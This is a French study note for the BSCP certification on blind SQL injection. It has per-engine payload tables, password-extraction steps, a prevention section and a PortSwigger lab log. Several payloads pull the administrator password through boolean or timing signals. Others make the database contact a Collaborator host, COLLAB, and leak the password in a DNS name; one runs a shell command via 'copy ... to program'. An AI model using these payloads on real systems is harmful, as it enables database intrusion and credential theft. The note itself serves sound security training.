---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# Blind-SQL-injection

## En bref
- Injection SQL où les réponses HTTP ne contiennent ni les résultats de la requête injectée, ni le détail des erreurs de la base de données.
- **Limite des techniques classiques** : les attaques `UNION` sont inefficaces, car elles reposent sur la possibilité de voir les résultats de la requête dans la réponse.
- On déduit l'information à partir d'un **signal indirect** : contenu de la page, erreur, temps de réponse ou interaction réseau.
- Les extractions se font une information à la fois (caractère par caractère), donc beaucoup de requêtes : on automatise avec Burp Intruder.
- Vocabulaire :
	- **Oracle booléen** (à ne pas confondre avec la base Oracle) : le mécanisme qui répond à une question vrai ou faux par requête envoyée.
	- **Signal** : la différence observable qui porte la réponse (message, longueur, code HTTP, temps, interaction).
	- **Bruit** : les variations qui ne dépendent pas de la condition (temps de réponse naturel, session, cache). Un signal n'est fiable que s'il dépasse le bruit.
- Le signal peut apparaître sur une autre page ou plus tard (cas du second ordre, voir [[SQL-injection]]).

## Types et variantes
| Variante | Signal observé | Quand l'utiliser |
|---|---|---|
| Réponses conditionnelles | Le contenu change (message, nombre de lignes) | Premier réflexe : la page réagit à une condition vraie ou fausse |
| Erreurs (conditionnelles et verbeuses) | Une erreur change la réponse, ou le message d'erreur affiche une valeur | Le contenu ne change pas mais une erreur est provocable, ou les erreurs sont affichées. Détail : [[Error-based SQL Injection]] |
| Délais (time delays) | Le temps de réponse | Aucun changement de contenu ni d'erreur |
| Hors bande (OAST) | Une requête DNS ou HTTP reçue sur un serveur contrôlé | La requête est exécutée de façon asynchrone, aucun autre signal |

Ordre de test conseillé : conditionnelle, puis erreurs, puis délais, puis hors bande.

### Blind SQLi - Réponses conditionnelles
- Exemple : une application utilise un cookie de suivi pour collecter des données analytiques. Chaque requête contient `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`.
- Pour savoir s'il s'agit d'un utilisateur connu, elle exécute : `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`.
- La requête est vulnérable, mais ses résultats ne sont pas envoyés à l'utilisateur.
- L'application se comporte différemment selon que la requête renvoie ou non des données : si le `TrackingId` est reconnu, la réponse contient le message « Welcome back ».

### Blind SQLi - Erreurs conditionnelles
- Quand le contenu ne change pas, on provoque une erreur uniquement si la condition est vraie : erreur (code 500, page d'erreur) pour vrai, page normale pour faux.
- Signal attendu : changement de code HTTP ou de page d'erreur selon la condition.
- Payloads par moteur, limites et lab : voir [[Error-based SQL Injection]].

### Blind SQLi - Erreurs verbeuses
- Quand les erreurs SQL sont affichées, le message d'erreur peut citer directement une valeur de la base (conversion de type qui échoue, par exemple).
- Signal attendu : la valeur recherchée apparaît dans le message.
- Payloads par moteur, limites (une seule ligne par sous-requête, message tronqué) et lab : voir [[Error-based SQL Injection]].

### Blind SQLi - Délais (time delays)
- Cas : ni contenu ni erreur ne changent, seul le temps de réponse varie.
- Délai simple de 10 secondes :
	- Oracle : `x'||dbms_pipe.receive_message(('a'),10)--`
	- SQL Server : `'; WAITFOR DELAY '0:0:10'--` (requête empilée obligatoire)
	- PostgreSQL : `'||pg_sleep(10)--`
	- MySQL : `' AND SLEEP(10)-- -` (voir le piège plus bas)
- Délai conditionnel :
	- Oracle : `' || (SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--`
	- SQL Server : `'; IF (cond) WAITFOR DELAY '0:0:10'--`
	- PostgreSQL : `'; SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (dans un cookie, encoder `;` en `%3B`)
	- MySQL : `' AND IF(cond,SLEEP(10),0)-- -`
- Piège MySQL : `AND SLEEP(10)` ne s'exécute que pour les lignes retenues. Si la requête ne renvoie aucune ligne, il n'y a aucun délai. Préférer `IF(cond,SLEEP(10),0)` sur un identifiant valide.
- Preuve attendue : environ 10 secondes si la condition est vraie, quasi nul si elle est fausse, de façon reproductible.
- Méthode de mesure :
	- Mesurer le bruit de base : 5 à 10 requêtes sans payload, noter la moyenne et l'écart-type du temps de réponse.
	- Détecter avec un délai court (3 à 5 secondes), puis allonger pour l'extraction.
	- Confirmer par inversion : vrai, faux, vrai.
	- Dans Intruder, une seule requête simultanée, sinon les délais se chevauchent. La dérive des délais sous charge fausse la mesure.

**Variantes complémentaires de délai** (`cond` = condition à tester)

| Technique | Moteur | Payload | Contexte | Signal attendu | Limites |
|---|---|---|---|---|---|
| Délai simple | MySQL | `xyz' AND SLEEP(5)-- ` | Chaîne | Environ 5 secondes | Aucun délai si aucune ligne n'est retenue |
| Délai conditionnel en sous-requête | PostgreSQL | `xyz' AND (SELECT CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END)<>''--` | Sans requête empilée | Délai si vrai | `pg_sleep` renvoie le type `void`, ce qui peut faire échouer la comparaison. La sous-requête n'est évaluée que si la ligne est lue |
| Délai conditionnel avec ASCII | PostgreSQL | `'; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109) THEN pg_sleep(5) ELSE pg_sleep(0) END--` | Cookie : `;` en `%3B` | Délai si vrai | Requêtes empilées exigées |
| Délai conditionnel empilé | SQL Server | `'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '0:0:5'--` | Requête empilée | 5 secondes si vrai | Interface qui interdit l'empilage |
| Sans fonction de pause (repli) | MySQL | `xyz' AND IF(cond,BENCHMARK(5000000,SHA1('a')),0)-- ` | `SLEEP` filtré | Durée variable | Imprécis, charge le serveur |
| Sans fonction de pause (repli) | Oracle | `xyz' AND (SELECT CASE WHEN (cond) THEN (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c) ELSE 0 END FROM dual)>=0--` | `dbms_pipe` bloqué | Durée variable | Charge le serveur, imprécis, à éviter sur un environnement partagé |
| Sans pause native (repli) | SQLite | `xyz' AND (SELECT CASE WHEN (cond) THEN randomblob(500000000) ELSE 1 END)` | Pas de fonction de délai | Ralentissement | Imprécis et lourd, à réserver à un laboratoire isolé |

### Blind SQLi - Hors bande (OAST, out-of-band application security testing)
- Cas : la requête est exécutée en tâche de fond, aucun signal direct. On force la base à émettre une requête DNS ou HTTP vers un serveur contrôlé (Burp Collaborator). `COLLAB` désigne le sous-domaine Collaborator.
- Oracle, version non corrigée (le correctif dépend de la version) : `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--`. Signal : requêtes DNS et HTTP reçues par Collaborator.
- Oracle, base corrigée : `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés requis).
- SQL Server : `'; exec master..xp_dirtree '//COLLAB/a'--`
- PostgreSQL : `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés requis)
- MySQL : `LOAD_FILE('\\\\COLLAB\\a')`, Windows uniquement. Prérequis : privilège `FILE` et variable `secure_file_priv` permissive. Variante avec exfiltration : `' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator'),'.COLLAB\\a'))-- `
- Exfiltration : placer le résultat d'une sous-requête dans le sous-domaine.
	- Oracle : `http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/` (dans le payload `EXTRACTVALUE(xmltype(...))` complet, valeur dans un cookie).
	- SQL Server : `'; DECLARE @p VARCHAR(99); SET @p=(SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree "//'+@p+'.COLLAB/a"')--`
	- Limites : caractères valides pour un nom DNS, étiquette limitée à 63 caractères, pare-feu sortant, droits du compte.
- Dans un cookie ou une URL, encoder `%`, `?`, `:`, `;`, le signe égal et les espaces.
- Preuve attendue : une interaction DNS ou HTTP reçue dans Collaborator, avec la valeur extraite dans le sous-domaine.

## Comment détecter
Les tests génériques (apostrophe, `OR 1=1`, délais, OAST) sont dans [[SQL-injection]]. Ici, uniquement ce qui est propre à l'aveugle.
- **Condition booléenne** : envoyer deux requêtes qui ne diffèrent que par la condition.
	- Chaîne : `x' AND '1'='1` puis `x' AND '1'='2`.
	- Numérique : `x AND 1=1` puis `x AND 1=2`.
- **Différences de réponse à comparer** (Burp Repeater, Comparer, Intruder) :
	- Contenu : présence d'un message, nombre de lignes affichées.
	- Longueur de la réponse (colonne Length d'Intruder).
	- Code HTTP, redirection, en-têtes (`Set-Cookie`).
	- Temps de réponse (variante par délai).
- **Test de syntaxe** : `'` puis `''`. Une erreur puis un retour à la normale indique que le guillemet est interprété. Si l'erreur est masquée, comparer le contenu.
- **Concaténation neutre** : `x'||'` (Oracle, PostgreSQL) ou `x'+'` (SQL Server). Une réponse inchangée suggère une injection dans une chaîne.
- **Aucune différence visible** : tester les erreurs conditionnelles, puis les délais, puis l'OAST.
- **Confirmation** : la différence doit être reproductible et dépendre de la condition (vrai donne A, faux donne B, plusieurs fois de suite).

## Comment exploiter (principe)
### Blind SQLi - Réponses conditionnelles
- On injecte une condition vraie ou fausse dans le cookie et on observe la présence ou l'absence du message « Welcome back ».
- Deux requêtes sont envoyées tour à tour, avec ces valeurs pour `TrackingId` :
	- `…xyz' AND '1'='1` : condition vraie, la requête renvoie des résultats, « Welcome back » s'affiche.
	- `…xyz' AND '1'='2` : condition fausse, aucun résultat, le message n'apparaît pas.
- **Conséquence** : on peut obtenir la réponse (vrai ou faux) à n'importe quelle condition injectée. Les données s'extraient une information à la fois (par exemple « le premier caractère du mot de passe est-il `a` ? »).

### Extraire un mot de passe caractère par caractère
- Hypothèse de l'exemple : une table `Users` avec les colonnes `Username` et `Password`, et un utilisateur `Administrator`.
- Dans les charges utiles de type chaîne (`xyz' AND '1'='1`), le dernier guillemet n'est pas écrit : c'est celui de la requête d'origine qui le fournit et ferme la chaîne. La comparaison numérique de l'étape 2 n'en a pas besoin.
- **Étape 1 : longueur.** `LENGTH(password)>N` (`LEN` sur SQL Server) avec N croissant (Repeater) jusqu'à ce que la condition devienne fausse. Cela borne le nombre de positions à tester.
- **Étape 2 : comparaisons sur le code du caractère.** Charge utile avec `SUBSTRING` (PostgreSQL, MySQL, SQL Server ; seul `SUBSTR` existe sur Oracle) :
	- `xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1)) > 109--`
	- Vrai : le code est supérieur à 109 (`m`). Faux : il est inférieur ou égal.
- **Étape 3 : recherche par dichotomie.** On coupe l'intervalle en deux à chaque requête : environ 7 requêtes par caractère sur 128 valeurs, contre jusqu'à 36 en testant a-z puis 0-9. On termine par une égalité sur le code exact, par exemple `ASCII(...) = 115`.
- On répète pour chaque position jusqu'au mot de passe complet.
- **Pourquoi `ASCII(...)` plutôt qu'une comparaison de texte** : la sensibilité à la casse de l'égalité dépend de la collation (souvent insensible sur MySQL et SQL Server). Comparer le code du caractère donne la casse exacte. Sur MySQL, `BINARY SUBSTRING(...)` est une alternative.
- **Volumétrie** : environ 7 requêtes par caractère en dichotomie, 20 caractères donnent donc de l'ordre de 140 requêtes, contre jusqu'à 720 en énumération a-z puis 0-9. Un pare-feu ou une limitation de cadence peut freiner le débit.

### Automatiser avec Burp Intruder
- Intruder énumère les charges utiles, il ne fait pas de dichotomie adaptative. La dichotomie se fait à la main ou par script.
- Une position (le caractère) et un jeu de charges : attaque Sniper, en changeant l'index à la main entre deux séries.
- Deux positions (index et caractère) et deux jeux de charges : attaque Cluster bomb. Nombre de requêtes : longueur du mot de passe multipliée par la taille du jeu (par exemple 20 x 36 = 720).
- Détecter le succès : onglet Settings, section Grep - Match, vider la liste puis ajouter « Welcome back ». Ou trier par longueur de réponse.
- Variante par délai : régler le Resource pool à une seule requête simultanée, sinon les délais se chevauchent et faussent la mesure.

### Catalogue booléen complémentaire
`xyz` = valeur d'origine du paramètre. Le dernier `'` est fourni par la requête d'origine.

| Technique | Moteur | Payload | Contexte | Signal attendu | Limites |
|---|---|---|---|---|---|
| Vrai et faux | Tous | `xyz' AND '1'='1` et `xyz' AND '1'='2` | Chaîne, cookie | Message présent puis absent | Une session expirée donne le même résultat que faux |
| Existence d'un utilisateur | PostgreSQL, MySQL | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` | Chaîne | Message présent si l'utilisateur existe | Une sous-requête à plusieurs lignes produit une erreur |
| Longueur | PostgreSQL, MySQL | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a` | Chaîne | Bascule du message à la valeur exacte | `LEN` sur SQL Server |
| Caractère par égalité | PostgreSQL | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` | Chaîne | Message présent si juste | Casse selon la collation |
| Dichotomie sur le code | PostgreSQL, MySQL, SQL Server | `xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--` | Chaîne | Environ 7 requêtes par caractère | Script ou Repeater ; sur Oracle, `SUBSTR` |
| Caractère | Oracle | `xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a' AND '1'='1` | Chaîne | Message présent si juste | `FROM dual` si pas de table |
| Caractère | SQL Server | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--` | Chaîne | Message présent si juste | `LEN` pour la longueur |
| Numérique | Tous | `1 AND 1=1` et `1 AND 1=2` | Paramètre numérique | Page identique à l'originale puis page vide | Aucune |
| Sensible à la casse | MySQL | `... AND BINARY SUBSTRING(password,1,1)='A'` | Collation insensible | Distingue `A` de `a` | Spécifique à MySQL |
| Existence de colonne | PostgreSQL | `xyz' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')=1--` | Chaîne | Message présent si la colonne existe | Droits sur `information_schema` |

### Requêtes empilées (quand l'empilage fonctionne)
- Possible sur SQL Server et PostgreSQL selon l'interface de programmation ; non sur Oracle, rare sur MySQL.
- Usage en aveugle : délai conditionnel (`WAITFOR DELAY`, `pg_sleep`), interaction hors bande. Dans un cookie, `;` s'encode en `%3B`.
- Danger : une instruction empilée peut modifier des données. Réserver à des fonctions inoffensives (délai, résolution DNS).
- Voir [[SQL-injection]] pour le principe général.

### Syntaxes par moteur (d'après la cheat sheet PortSwigger)
`cond` désigne la condition à tester.

| Besoin | Oracle | MySQL | PostgreSQL | SQL Server | SQLite |
|---|---|---|---|---|---|
| Sous-chaîne | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `substr(s,1,1)` |
| Longueur | `LENGTH(s)` | `LENGTH(s)` (en octets) ou `CHAR_LENGTH(s)` (en caractères) | `LENGTH(s)` | `LEN(s)` | `length(s)` |
| Code du caractère | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `unicode(c)` |
| Condition | `CASE WHEN cond THEN a ELSE b END` | `IF(cond,a,b)` ou `CASE` | `CASE WHEN cond THEN a ELSE b END` | `CASE`, ou `IF cond` (empilé) | `CASE WHEN cond THEN a ELSE b END` |
| Délai | `dbms_pipe.receive_message(('a'),10)` | `SLEEP(10)` | `pg_sleep(10)` | `WAITFOR DELAY '0:0:10'` | aucune fonction native |
| Commentaire | `--` | `-- ` (avec espace) ou `#` | `--` | `--` | `--` |
| Concaténation | `'a'\|\|'b'` | `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` |
| Requêtes empilées | non | rare | oui | oui | selon l'interface |
| `SELECT` sans table | exige `FROM dual` | oui | oui | oui | oui |
| Limiter à une ligne | `ROWNUM=1`, ou `FETCH FIRST 1 ROWS ONLY` (12c et suivantes) | `LIMIT 1` | `LIMIT 1` | `TOP 1` | `LIMIT 1` |
| Version | `SELECT banner FROM v$version` | `@@version` | `version()` | `@@version` | `sqlite_version()` |

MySQL : `||` vaut `OR` par défaut, ce n'est pas une concaténation.

## Pièges et points d'attention BSCP
Les pièges communs (commentaire MySQL, encodage URL, `OR 1=1` sur écriture) sont dans [[SQL-injection]].
- **Point d'injection** : souvent le cookie `TrackingId`, pas un paramètre. Tester aussi `session`, les autres cookies et les en-têtes (`X-Forwarded-For`, `Referer`, `User-Agent`).
- **`TrackingId` et `session`** : injecter dans `TrackingId` en laissant `session` intact, sinon la réponse change pour une autre raison (déconnexion).
- **Encodage dans un cookie** : `;` sépare les cookies, donc l'encoder en `%3B` pour les requêtes empilées. Dans un cookie, le `+` n'est pas forcément décodé en espace : utiliser `%20` ou un vrai espace selon la réaction de l'application.
- **Corps JSON ou XML** : échapper les guillemets dans du JSON, utiliser des entités dans du XML ; tester les points d'entrée un par un (cookie par cookie, paramètre par paramètre).
- **Message « Welcome back »** : il peut dépendre de la session. Une session expirée donne le même résultat qu'une condition fausse.
- **Verrouillage de compte** : injecter dans une fonction de connexion peut bloquer le compte testé.
- **Cache** : une réponse mise en cache masque le signal ; faire varier un en-tête ou un paramètre inoffensif.
- **Délai sans effet** : sur MySQL, comme sur PostgreSQL pour une sous-requête, le délai ne se produit que si une ligne est lue.
- **Oracle** : tout `SELECT` exige `FROM dual`, la concaténation se fait avec `||`, la sous-chaîne avec `SUBSTR`.
- **Longueur d'abord** : déterminer la longueur du mot de passe avant de lancer Intruder.
- **Requêtes asynchrones** : si ni contenu, ni erreur, ni délai ne réagissent, la requête est probablement exécutée en tâche de fond. Passer à l'OAST.
- **Privilèges** : `xp_dirtree`, `COPY ... TO PROGRAM` et `UTL_INADDR` peuvent exiger des droits élevés.
- **Outils tiers** : vérifier dans les règles officielles de l'examen si sqlmap est autorisé avant de compter dessus.

## Prévention
Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège). Spécifique aux variantes aveugles :
- Paramétrer toutes les requêtes, y compris celles qui utilisent des cookies et des en-têtes, qui sont des entrées non fiables. Les noms de colonnes et les `ORDER BY` dynamiques passent par une liste blanche.
- Valider le format d'un identifiant de suivi (longueur, jeu de caractères) avant la requête.
- Renvoyer des réponses uniformes : même contenu, même code HTTP et même temps de réponse que la requête réussisse ou échoue, sans page d'erreur détaillée.
- Compte de base de données sans accès aux fonctions réseau (`xp_dirtree`, `UTL_INADDR`, `COPY ... PROGRAM`, `LOAD_FILE`) ni aux requêtes empilées inutiles.
- Filtrer les flux sortants : le serveur de base de données ne doit pas pouvoir émettre de DNS ou de HTTP vers Internet, ce qui bloque l'OAST.
- Surveiller les requêtes lentes répétitives (délais) et les rafales d'erreurs SQL.

## Labs PortSwigger
Tous les labs de la catégorie sont de niveau Practitioner, d'après l'agent (liste et moteurs non revérifiés en ligne).
- [x] Blind SQL injection with conditional responses (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with conditional errors (Oracle probable) ✅ 2026-11-02
- [x] Visible error-based SQL injection (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with time delays (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with time delays and information retrieval (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with out-of-band interaction (Oracle probable) ✅ 2026-11-02
- [x] Blind SQL injection with out-of-band data exfiltration (Oracle probable) ✅ 2026-11-02

## Journal des labs
### Lab: Blind SQL injection with conditional responses
- **Énoncé** : injection aveugle dans le cookie de suivi `TrackingId`. Le résultat n'est pas renvoyé et aucune erreur n'est affichée, mais la page contient « Welcome back » si la requête renvoie au moins une ligne. Table `users` (colonnes `username` et `password`). Objectif : se connecter en tant que `administrator`.
- **Moteur** : PostgreSQL probable, non vérifié (`LIMIT 1` et `LENGTH` supposent PostgreSQL ou MySQL).
- **Méthode** (valeur d'origine du cookie notée `xyz` ; le dernier `'` manquant dans chaque payload est fourni par la requête d'origine)
	1. Intercepter la requête avec Burp et modifier `TrackingId`.
	2. Vérifier vrai et faux : `xyz' AND '1'='1` (message présent), `xyz' AND '1'='2` (message absent).
	3. Confirmer la table : `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
	4. Confirmer l'utilisateur : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
	5. Longueur du mot de passe, avec N croissant dans Repeater : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a`. Résultat : 20 caractères.
	6. Envoyer la requête dans Intruder, position sur le dernier `a` : `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`. Jeu de charges : a-z puis 0-9 (le mot de passe est supposé alphanumérique minuscule). Grep - Match : « Welcome back ».
	7. Relancer en changeant l'offset de 1 à 20, noter le caractère trouvé à chaque position.
	8. Se connecter via « My account » avec le mot de passe obtenu.


### Modèle pour les autres labs
```markdown
### Lab: <titre exact PortSwigger>
- **Énoncé** : (2 à 3 lignes en français)
- **Moteur et variante** : (Oracle, PostgreSQL... ; conditionnelle, erreur, délai ou OAST)
- **Signal observé** : (contenu, erreur, temps ou interaction)
- **Méthode** :
	1.
- **Payloads clés** (exacts) :
	- `...`
- **Pièges rencontrés** :
- **Statut et date** :
```

## Liens
- [[SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Error-based SQL Injection]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
